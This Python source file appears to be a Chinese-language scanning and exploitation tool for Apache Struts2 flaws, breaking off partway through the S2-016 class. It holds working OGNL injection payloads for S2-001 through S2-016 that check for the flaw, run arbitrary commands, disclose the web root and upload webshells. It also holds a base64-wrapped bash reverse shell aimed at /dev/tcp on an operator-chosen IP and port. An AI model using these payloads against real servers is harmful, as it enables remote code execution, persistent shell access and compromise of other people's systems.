# coding=UTF-8

import shlex
import random
import base64
import copy
import os
import hashlib
import string
import click
import requests
import urllib.request
import urllib.parse
import urllib.error
import time
from requests.exceptions import ChunkedEncodingError, ConnectionError, ConnectTimeout
from urllib.parse import quote, unquote
from functools import partial
from bs4 import BeautifulSoup
from concurrent import futures

__title__ = 'Struts2 Scan'
__version__ = '0.1'
__author__ = 'HatBoy'

"""
基于互联网上已经公开的Structs2高危漏洞exp的扫描利用工具，目前支持的漏洞如下：
S2-001,S2-003,S2-005,S2-007,S2-008,S2-009,S2-012,S2-013,S2-015,S2-016,S2-019,
S2-029,S2-032,S2-033,S2-037,S2-045,S2-046,S2-048,S2-052,S2-053,S2-devMode
"""

default_headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'
}

# 全局代理
proxies = None
# 超时时间
_tiemout = 10
# 默认输出所有结果，包括不存在漏洞的
is_quiet = False
# 进程数
process = 10


def get(url, headers=None, encoding='UTF-8'):
    """GET请求发送包装"""
    try:
        html = requests.get(url, headers=headers, proxies=proxies, timeout=_tiemout)
        html = html.content.decode(encoding)
        return html.replace('\x00', '').strip()
    except ChunkedEncodingError as e:
        html = get_stream(url, headers, encoding)
        return html
    except ConnectionError as e:
        return "ERROR:" + "HTTP连接错误"
    except ConnectTimeout as e:
        return "ERROR:" + "HTTP连接超时错误"
    except Exception as e:
        return 'ERROR:' + str(e)


def get_302(url, headers=None, encoding='UTF-8'):
    """GET请求发送包装"""
    try:
        html = requests.get(url, headers=headers, proxies=proxies, timeout=_tiemout, allow_redirects=False)
        status_code = html.status_code
        if status_code == 302:
            html = html.headers.get("Location", "")
        elif status_code == 200:
            html = html.content.decode(encoding)
            html = html.replace('\x00', '').strip()
        else:
            html = ""
        return html
    except ConnectionError as e:
        return "ERROR:" + "HTTP连接错误"
    except ConnectTimeout as e:
        return "ERROR:" + "HTTP连接超时错误"
    except Exception as e:
        return 'ERROR:' + str(e)


def get_stream(url, headers=None, encoding='UTF-8'):
    """分块接受数据"""
    try:
        lines = requests.get(url, headers=headers, timeout=_tiemout, stream=True, proxies=proxies)
        html = list()
        for line in lines.iter_lines():
            if b'\x00' in line:
                break
            line = line.decode(encoding)
            html.append(line.strip())
        return '\r\n'.join(html).strip()
    except ChunkedEncodingError as e:
        return '\r\n'.join(html).strip()
    except ConnectionError as e:
        return "ERROR:" + "HTTP连接错误"
    except ConnectTimeout as e:
        return "ERROR:" + "HTTP连接超时错误"
    except Exception as e:
        return 'ERROR:' + str(e)


def post(url, data=None, headers=None, encoding='UTF-8', files=None):
    """POST请求发送包装"""
    try:
        html = requests.post(url, data=data, headers=headers, proxies=proxies, timeout=_tiemout, files=files)
        html = html.content.decode(encoding)
        return html.replace('\x00', '').strip()
    except ChunkedEncodingError as e:
        html = post_stream(url, data, headers, encoding, files)
        return html
    except ConnectionError as e:
        return "ERROR:" + "HTTP连接错误"
    except ConnectTimeout as e:
        return "ERROR:" + "HTTP连接超时错误"
    except Exception as e:
        return 'ERROR:' + str(e)


def post_stream(url, data=None, headers=None, encoding='UTF-8', files=None):
    """分块接受数据"""
    try:
        lines = requests.post(url, data=data, headers=headers, timeout=_tiemout, stream=True, proxies=proxies,
                              files=None)
        html = list()
        for line in lines.iter_lines():
            line = line.decode(encoding)
            html.append(line.strip())
        return '\r\n'.join(html).strip()
    except ChunkedEncodingError as e:
        return '\r\n'.join(html).strip()
    except ConnectionError as e:
        return "ERROR:" + "HTTP连接错误"
    except ConnectTimeout as e:
        return "ERROR:" + "HTTP连接超时错误"
    except Exception as e:
        return 'ERROR:' + str(e)


def encode_multipart(exp):
    """创建multipart/form-data数据包"""
    boundary = '----------%s' % hex(int(time.time() * 1000))
    data = list()
    data.append('--%s' % boundary)
    content = b'x'
    decoded_content = content.decode('ISO-8859-1')
    data.append('Content-Disposition: form-data; name="test"; filename="{exp}"'.format(exp=exp))
    data.append('Content-Type: text/plain\r\n')
    data.append(decoded_content)
    data.append('--%s--\r\n' % boundary)
    return '\r\n'.join(data), boundary


def post_file(url, exp, headers=None, encoding='UTF-8'):
    """S2-046漏洞专用"""
    try:
        coded_params, boundary = encode_multipart(exp)
        if proxies:
            proxy_support = urllib.request.ProxyHandler(proxies)
            opener = urllib.request.build_opener(proxy_support)
            urllib.request.install_opener(opener)
        req = urllib.request.Request(url, coded_params.encode('ISO-8859-1'))
        req.add_header('Content-Type', 'multipart/form-data; boundary=%s' % boundary)
        if headers:
            for key, value in headers.items():
                req.add_header(key, value)
        resp = urllib.request.urlopen(req)
        html = resp.read().decode(encoding)
        return html
    except ConnectionError as e:
        return "ERROR:" + "HTTP连接错误"
    except ConnectTimeout as e:
        return "ERROR:" + "HTTP连接超时错误"
    except Exception as e:
        return 'ERROR:' + str(e)


def parse_cmd(cmd, type='string'):
    """命令解析，将要执行的命令解析为字符串格式"""
    cmd = shlex.split(cmd)
    if type == 'string':
        cmd_str = '"' + '","'.join(cmd) + '"'
    elif type == 'xml':
        cmd_str = '<string>' + '</string><string>'.join(cmd) + '</string>'
    else:
        cmd_str = cmd
    return cmd_str


def parse_headers(headers):
    """将headers字符串解析为字典"""
    if not headers:
        return default_headers
    new_headers = copy.deepcopy(default_headers)
    headers = headers.split('&')
    for header in headers:
        header = header.split(':')
        new_headers[header[0].strip()] = header[1].strip()
    return new_headers


def get_hash():
    """获取随机字符串"""
    letters = string.ascii_letters
    rand = ''.join(random.sample(letters, 10))
    hash = hashlib.md5(rand.encode()).hexdigest()
    return hash


def echo_check(self):
    """通过echo输出检查漏洞是否存在"""
    hash_str = get_hash()
    html = self.exec_cmd("echo " + hash_str)
    if html.startswith("ERROR:"):
        return html
    elif hash_str in html:
        return True
    else:
        return False


def reverse_shell(self, ip, port):
    """反弹shell"""
    cmd = "bash -i >& /dev/tcp/{ip}/{port} 0>&1".format(ip=ip, port=port)
    cmd = base64.b64encode(cmd.encode()).decode()
    shell = self.shell.replace('SHELL', cmd)
    html = self.exec_cmd(shell)
    return html


def check_file(file_path):
    """检查文件是否存在"""
    if os.path.exists(file_path):
        return True
    else:
        click.secho("[ERROR] {file}文件不存在!".format(file=file_path), fg='red')
        exit(0)


def read_file(file_path, encoding='UTF-8'):
    """读文件，默认使用UTF-8编码"""
    if check_file(file_path):
        with open(file_path, 'r', encoding=encoding) as f:
            data = f.read()
        return data


def read_urls(file):
    """读取URL文件"""
    if check_file(file):
        with open(file, 'r', encoding='UTF-8') as f:
            urls = f.readlines()
        urls = [url.strip() for url in urls if url and url.strip()]
        return urls


def check_int(name, t):
    """检查int变量"""
    try:
        t = int(t)
        return t
    except Exception as e:
        click.secho("[ERROR] 参数{name}必须为整数!".format(name=name), fg='red')
        exit(0)


class S2_001:
    """S2-001漏洞检测利用类"""
    info = "[+] S2-001:影响版本Struts 2.0.0-2.0.8; POST请求发送数据; 默认参数为:username,password; 支持获取WEB路径,任意命令执行和反弹shell"
    check_poc = "%25%7B{num1}%2B{num2}%7D"
    web_path = "%25%7B%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23response%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23response.println(%23req.getRealPath('%2F'))%2C%23response.flush()%2C%23response.close()%7D"
    exec_payload = "%25%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B{cmd}%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D"
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        if not data:
            self.data = "username=test&password={exp}"
        else:
            self.data = data
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.is_vul = False
        if 'Content-Type' not in self.headers:
            self.headers['Content-Type'] = 'application/x-www-form-urlencoded'

    def check(self):
        """检测漏洞是否存在"""
        num1 = random.randint(10000, 100000)
        num2 = random.randint(10000, 100000)
        poc = self.check_poc.format(num1=num1, num2=num2)
        data = self.data.format(exp=poc)
        html = post(self.url, data, self.headers, self.encoding)
        nn = str(num1 + num2)
        if html.startswith("ERROR:"):
            return html
        elif nn in html:
            self.is_vul = True
            return 'S2-001'
        return self.is_vul

    def get_path(self):
        """获取web目录"""
        data = self.data.format(exp=self.web_path)
        html = post(self.url, data, self.headers, self.encoding)
        return html

    def exec_cmd(self, cmd):
        """执行命令"""
        cmd = parse_cmd(cmd)
        data = self.data.format(exp=self.exec_payload.format(cmd=quote(cmd)))
        html = post(self.url, data, self.headers, self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = reverse_shell(self, ip, port)
        return html


class S2_003:
    """S2-003漏洞检测利用类"""
    info = "[+] S2-003:影响版本Struts 2.0.0-2.0.11.2; GET请求发送数据; 支持任意命令执行"
    exec_payload = "%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&%28%27%5Cu0023mycmd%5Cu003d%5C%27{cmd}%5C%27%27%29%28bla%29%28bla%29&%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.is_vul = False

    def check(self):
        """检测漏洞是否存在"""
        html = echo_check(self)
        if str(html).startswith("ERROR:"):
            return html
        if html:
            self.is_vul = True
            return 'S2-003'
        return self.is_vul

    def exec_cmd(self, cmd):
        """执行命令"""
        payload = self.exec_payload.format(cmd=quote(cmd))
        html = get(self.url + '?' + payload, self.headers, self.encoding)
        return html


class S2_005:
    """S2-005漏洞检测利用类"""
    info = "[+] S2-005:影响版本Struts 2.0.0-2.1.8.1; GET请求发送数据; 支持获取WEB路径,任意命令执行"
    web_path = "%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest%28%29%27%29%28d%29%29&%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28i97%29%28%28%27%5C43xman.getWriter%28%29.println%28%5C43req.getRealPath%28%22%5Cu005c%22%29%29%27%29%28d%29%29&%28i99%29%28%28%27%5C43xman.getWriter%28%29.close%28%29%27%29%28d%29%29"
    exec_payload1 = "%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29&%28%27%5Cu0023mycmd%5Cu003d%5C%27{cmd}%5C%27%27%29%28bla%29%28bla%29&%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29"
    exec_payload2 = "%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43mycmd%5C75%5C%27{cmd}%5C%27%27%29%28d%29%29&%28h%29%28%28%27%5C43myret%5C75@java.lang.Runtime@getRuntime%28%29.exec%28%5C43mycmd%29%27%29%28d%29%29&%28i%29%28%28%27%5C43mydat%5C75new%5C40java.io.DataInputStream%28%5C43myret.getInputStream%28%29%29%27%29%28d%29%29&%28j%29%28%28%27%5C43myres%5C75new%5C40byte[51020]%27%29%28d%29%29&%28k%29%28%28%27%5C43mydat.readFully%28%5C43myres%29%27%29%28d%29%29&%28l%29%28%28%27%5C43mystr%5C75new%5C40java.lang.String%28%5C43myres%29%27%29%28d%29%29&%28m%29%28%28%27%5C43myout%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28n%29%28%28%27%5C43myout.getWriter%28%29.println%28%5C43mystr%29%27%29%28d%29%29"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.is_vul = False

    def check(self):
        """选择可以利用成功的payload"""
        self.exec_payload = self.exec_payload1
        html = echo_check(self)
        if str(html).startswith("ERROR:"):
            return html
        if html:
            self.is_vul = True
            return 'S2-005'
        else:
            self.exec_payload = self.exec_payload2
            html = echo_check(self)
            if str(html).startswith("ERROR:"):
                return html
            if html:
                self.is_vul = True
                return 'S2-005'
        return self.is_vul

    def get_path(self):
        """获取web目录"""
        html = get(self.url + '?' + self.web_path, self.headers, self.encoding)
        return html

    def exec_cmd(self, cmd):
        """执行命令"""
        payload = self.exec_payload.format(cmd=quote(cmd))
        html = get_stream(self.url + '?' + payload, self.headers, self.encoding)
        return html


class S2_007:
    """S2-007漏洞检测利用类"""
    info = "[+] S2-007:影响版本Struts 2.0.0-2.2.3; POST请求发送数据; 默认参数为:username,password; 支持任意命令执行和反弹shell"
    exec_payload = "'%20%2B%20(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('{cmd}').getInputStream()))%20%2B%20'"
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        if not data:
            self.data = "username=test&password={exp}"
        else:
            self.data = data
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.is_vul = False
        if 'Content-Type' not in self.headers:
            self.headers['Content-Type'] = 'application/x-www-form-urlencoded'

    def check(self):
        """检测漏洞是否存在"""
        html = echo_check(self)
        if str(html).startswith("ERROR:"):
            return html
        if html:
            self.is_vul = True
            return 'S2-007'
        return self.is_vul

    def exec_cmd(self, cmd):
        """执行命令"""
        data = self.data.format(exp=self.exec_payload.format(cmd=quote(cmd)))
        html = post_stream(self.url, data, self.headers, self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = reverse_shell(self, ip, port)
        return html


class S2_008:
    """S2-008漏洞检测利用类"""
    info = "[+] S2-008:影响版本Struts 2.1.0-2.3.1; GET请求发送数据; 支持任意命令执行和反弹shell"
    exec_payload = "/devmode.action?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27{cmd}%27%29.getInputStream%28%29%29)"

    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.is_vul = False

    def check(self):
        """检测漏洞是否存在"""
        html = echo_check(self)
        if str(html).startswith("ERROR:"):
            return html
        if html:
            self.is_vul = True
            return 'S2-008'
        return self.is_vul

    def exec_cmd(self, cmd):
        """执行命令"""
        payload = self.exec_payload.format(cmd=quote(cmd))
        html = get(self.url + payload, self.headers, self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = reverse_shell(self, ip, port)
        return html


class S2_009:
    """S2-009漏洞检测利用类"""
    info = "[+] S2-009:影响版本Struts 2.0.0-2.3.1.1; GET请求发送数据,URL后面需要请求参数名; 默认为: key; 支持任意命令执行和反弹shell"
    exec_payload = "(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27{cmd}%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[({key})(%27meh%27)]"

    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        if not data:
            self.data = "key"
        else:
            self.data = data.split('=')[0].strip()
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.is_vul = False

    def check(self):
        """检测漏洞是否存在"""
        html = echo_check(self)
        if str(html).startswith("ERROR:"):
            return html
        if html:
            self.is_vul = True
            return 'S2-009'
        return self.is_vul

    def exec_cmd(self, cmd):
        """执行命令"""
        payload = self.exec_payload.format(cmd=quote(cmd), key=self.data)
        html = get(self.url + "&{key}={payload}".format(key=self.data, payload=payload), self.headers, self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = reverse_shell(self, ip, port)
        return html


class S2_012:
    """S2-012漏洞检测利用类"""
    info = "[+] S2-012:影响版本Struts Showcase App 2.0.0-2.3.13; GET请求发送数据,参数直接添加到URL后面; 默认为:name; 支持任意命令执行和反弹shell"
    exec_payload = "%25%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B{cmd}%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D"
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.is_vul = False

    def check(self):
        """检测漏洞是否存在"""
        html = echo_check(self)
        if str(html).startswith("ERROR:"):
            return html
        if html:
            self.is_vul = True
            return 'S2-012'
        return self.is_vul

    def exec_cmd(self, cmd):
        """执行命令"""
        cmd = parse_cmd(cmd)
        payload = self.exec_payload.format(cmd=quote(cmd))
        html = get(self.url + payload, self.headers, self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = reverse_shell(self, ip, port)
        return html


class S2_013:
    """S2-013/S2-014漏洞检测利用类"""
    info = "[+] S2-013/S2-014:影响版本Struts 2.0.0-2.3.14.1; GET请求发送数据; 支持获取WEB路径,任意命令执行,反弹shell和文件上传"
    web_path = "%24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23k8out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23k8out.println(%23req.getRealPath(%22%2F%22))%2C%23k8out.close())%7D"
    exec_payload = "%24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec('{cmd}').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%23d)%2C%23out.close())%7D"
    upload_paylaod = "$%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23fos=%20new%20java.io.FileOutputStream(%23req.getParameter(%22f%22)),%23fos.write(%23req.getParameter(%22t%22).getBytes()),%23fos.close(),%23outstr.println(%22OK%22),%23outstr.close())%7D"
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.is_vul = False
        if 'Content-Type' not in self.headers:
            self.headers['Content-Type'] = 'application/x-www-form-urlencoded'

    def check(self):
        """检测漏洞是否存在"""
        html = echo_check(self)
        if str(html).startswith("ERROR:"):
            return html
        if html:
            self.is_vul = True
            return 'S2-013'
        return self.is_vul

    def get_path(self):
        """获取web目录"""
        html = get(self.url + "?x={payload}".format(payload=self.web_path), self.headers, self.encoding)
        return html

    def exec_cmd(self, cmd):
        """执行命令"""
        html = get(self.url + "?x={payload}".format(payload=self.exec_payload.format(cmd=quote(cmd))), self.headers,
                   self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = reverse_shell(self, ip, port)
        return html

    def upload_shell(self, upload_path, shell_path):
        shell = read_file(shell_path, self.encoding)
        data = "t={t}&f={f}".format(t=quote(shell), f=upload_path)
        html = post(self.url + "?x={payload}".format(payload=self.upload_paylaod), data, self.headers, self.encoding)
        if html == 'OK':
            return True
        else:
            return False


class S2_015:
    """S2-015漏洞检测利用类"""
    info = "[+] S2-015:影响版本Struts 2.0.0-2.3.14.2; GET请求发送数据; 支持任意命令执行和反弹shell"
    exec_payload = "%24%7B%23context%5B'xwork.MethodAccessor.denyMethodExecution'%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('{cmd}').getInputStream())%2C%23q%7D"
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        if url.endswith(".action"):
            rindex = url.rindex('/')
            self.url = url[:rindex + 1]
        elif url.endswith("/"):
            self.url = url
        else:
            self.url = url + '/'
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.is_vul = False

    def check(self):
        """检测漏洞是否存在"""
        html = echo_check(self)
        if str(html).startswith("ERROR:"):
            return html
        if html:
            self.is_vul = True
            return 'S2-015'
        return self.is_vul

    def exec_cmd(self, cmd):
        """执行命令"""
        payload = self.exec_payload.format(cmd=quote(cmd))
        html = get(self.url + "{payload}.action".format(payload=payload), self.headers, self.encoding)
        if html.startswith('ERROR:'):
            return html
        try:
            soup = BeautifulSoup(html, 'lxml')
            ps = soup.find_all('p')
            result = unquote(ps[1].text[9:-4]).strip()
            return result
        except Exception as e:
            return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = reverse_shell(self, ip, port)
        return html


class S2_016:
    """S2-016漏洞检测利用类"""
    info = "[+] S2-016:影响版本Struts 2.0.0-2.3.15; GET请求发送数据; 支持获取WEB路径,任意命令执行,反弹shell和文件上传"
    check_poc = "redirect%3A%24%7B{num1}%2B{num2}%7D"
    web_path = "redirect:$%7B%23a%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23b%3d%23a.getRealPath(%22/%22),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23b),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D"
    exec_payload1 = "redirect%3A%24%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B{cmd}%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader%20(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23matt%3D%20%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C%23matt.getWriter().println%20(%23e)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D"
    exec_payload2 = "redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22{cmd}%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D"
    exec_payload3 = r"redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27CMD%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27ENCODING%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}"
    upload_payload1 = r"""redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.getWriter().print(%22O%22),%23res.getWriter().print(%22K%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%22PATH%22)).append(%23req.getParameter(%22t%22)).close()}&t=SHELL"""
    upload_payload2 = "redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletRequest%22)%2C%23b%3Dnew%20java.io.FileOutputStream(new%20java.lang.StringBuilder(%23a.getRealPath(%22%2F%22)).append(%40java.io.File%40separator).append(%22{path}%22).toString())%2C%23b.write(%23a.getParameter(%22t%22).getBytes())%2C%23b.close()%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%22OK%22)%2C%23genxor.flush()%2C%23genxor.close()%7D"
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.is_vul = False
        self.exec_payload = "payload1"
        self.exec_dict = {"payload1": self.exec_cmd1, "payload2": self.exec_cmd2, "payload3": self.exec_cmd3}
